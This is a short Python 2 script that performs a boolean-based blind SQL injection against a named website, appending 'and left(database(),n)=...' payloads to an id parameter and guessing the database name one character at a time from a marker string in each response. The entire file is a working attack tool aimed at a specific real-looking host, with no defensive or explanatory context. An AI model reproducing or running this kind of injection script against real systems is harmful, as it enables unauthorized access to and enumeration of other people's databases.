#encoding=utf-8

import time

import string

import sys

import random

import urllib

import urllib2

data={}

def http_conn(url):

	url_test='http://web3.17500.cn/800/nr.php?id=27'+url#添加网址

	req=urllib2.urlopen(url_test)

	html_doc=req.read()

	if html_doc.find('2010069')>0:

		return True

	else:

		return False

database='c'

payloads=list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')

for i in range(2,10,1):

	for payload in payloads:

		url=" and left(database(),%s)='%s' " % (i,(database+payload))

		print url

		if http_conn(url)==True:

			database+=payload

			print 'current database:'+database

			break